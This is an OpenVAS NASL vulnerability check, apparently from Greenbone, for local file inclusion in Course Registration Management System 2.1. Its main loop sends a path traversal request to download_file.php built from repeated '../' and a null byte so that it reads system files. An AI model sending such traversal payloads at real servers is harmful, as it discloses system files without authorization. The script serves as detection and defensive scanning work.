###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_coursems_46495.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Course MS Cross Site Scripting, SQL Injection and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Course Registration Management System is prone to multiple input-
validation vulnerabilities, including:

1. Multiple cross-site scripting vulnerabilities
2. An SQL-injection vulnerability
3. A local file-include vulnerability

Exploiting these issues could allow an attacker to execute arbitrary
script code and PHP code in the browser of an unsuspecting user in the
context of the affected site, steal cookie-based authentication
credentials, compromise the application, access or modify data, or
exploit latent vulnerabilities in the underlying database.

Course Registration Management System 2.1 is vulnerable; other
versions may also be affected.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103088");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-02-23 13:14:43 +0100 (Wed, 23 Feb 2011)");
 script_bugtraq_id(46495);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Course MS Cross Site Scripting, SQL Injection and Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46495");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/coursems/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/coursems", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/download_file.php?path=",crap(data:"../",length:6*9),files[file],"%00");
    if(http_vuln_check(port:port, url:url, pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
